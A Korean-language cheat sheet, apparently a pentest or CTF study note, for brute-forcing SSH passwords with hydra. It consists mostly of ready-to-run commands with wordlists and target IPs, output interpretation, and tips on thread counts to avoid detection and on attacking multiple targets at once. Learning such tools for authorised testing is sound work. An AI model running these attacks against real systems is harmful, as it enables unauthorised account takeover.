# hydra — SSH

- SSH(22/tcp, 비표준 포트 포함) 서비스에 대한 온라인 패스워드 브루트포스 — `-l/-L`·`-P`로 계정·패스워드 리스트를 넣고 ssh 모듈로 대상에 직접 인증 시도
- SSH 포트 접근 가능, hydra 설치(Kali 기본), 워드리스트(rockyou.txt·SecLists) — -t 과다 시 탐지·계정 잠금 위험, 비표준 포트는 -s로 지정
- 공통 옵션(-l/-L/-p/-P/-s/-t/-f/-V 등)과 전체 절차는 `hydra-structured.md`, `hydra_practice.md` 참고

## 기본형

```bash
# 단일 사용자, 기본 포트 22
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10

# 사용자명 리스트 + 패스워드 리스트, 스레드 4
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4

# 비표준 포트 (예: 2222)
hydra -l root -P passwords.txt ssh://10.10.10.10 -s 2222
hydra -l admin -P pass.txt -s 2222 192.168.1.5 ssh
```

## 단계별 시도

```bash
# 1단계: 빠른 크래킹 (일반적인 비밀번호부터)
hydra -l root -P passwords-common.txt ssh://10.10.10.10 -t 4 -V

# 2단계: 전체 리스트로
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4

# 3단계: 사용자명도 모를 때
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4
```

## 실전 예시

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.20.141 -t 4 ssh
hydra -l <username> -P <wordlist> 10.201.20.141 -t 4 ssh
hydra -l think -P password.txt ssh://10.10.67.138 --t 40 -v
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.106.187 -t 4
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.201.106.187 -t 4 ssh
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
hydra -l root -P rockyou.txt 192.168.0.10 ssh
```

## 결과 해석

```
[22][ssh] host: 10.10.10.10 login: root password: 123456
```

- `[포트][ssh]`: 서비스 정보
- `host`: 대상 IP
- `login`: 유효한 사용자명
- `password`: 유효한 비밀번호

## 주의

- `-t`는 4~8 권장. 과다 시 탐지·계정 잠금
- 비표준 포트는 `-s` 병기
- 여러 대상 동시 공격은 `-M targets.txt`